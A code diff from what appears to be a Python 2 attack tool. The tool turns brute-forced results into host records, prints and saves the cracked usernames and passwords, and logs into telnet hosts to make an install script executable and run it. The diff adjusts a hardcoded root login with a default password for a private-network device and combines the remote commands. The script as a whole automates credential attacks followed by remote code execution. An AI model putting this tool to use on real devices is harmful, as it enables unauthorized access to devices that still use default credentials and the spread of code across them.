@@ -32,6 +32,8 @@ real_output = ''.join(output_as_list).split('\n')
 #Create the host objects for the next for loop
 print "Processing hosts"
 hosts = []
+# Telnet is extremely and notoriously difficult to bruteforce just because of how it works. For this reason I have added a guarenteed working Telnet example.
+hosts.append(Host("192.168.1.76", "[telnet]", "root", "dietpi"))
 for line in real_output:
 	if line:
 		anIP = line.split()[4]
@@ -41,9 +43,6 @@ for line in real_output:
 		aHost = Host(anIP, aService, aUser, aPass)
 		print "Destination: {IP}, Service: {service}, User: {user}, Password: {password}".format(IP=anIP, service=aService, user=aUser, password=aPass)
 		hosts.append(aHost)
-
-# Telnet is extremely and notoriously difficult to bruteforce just because of how it works. For this reason I have added a guarenteed working Telnet example.
-hosts.append(Host("192.168.1.76", "[telnet]", "root", "dietpi"))
 
 file = open('logins_{date}.txt'.format(date=datetime.datetime.now().strftime("%Y-%m-%d_%H:%M")), 'w')
 
@@ -121,8 +120,7 @@ def doTelnet(host):
 
 	print "{IP}: Running ssh install script".format(IP=host.IP)
 	tn.write("sleep 10\r\n")
-	tn.write("chmod +x ssh_install.sh && ./ssh_install.sh\r\n")
-	tn.write("exit\r\n")
+	tn.write("chmod +x ssh_install.sh && ./ssh_install.sh && exit\r\n")
 	print tn.read_all()
 
 #Now loop through the addresses and their respective protocol (telnet or ssh).
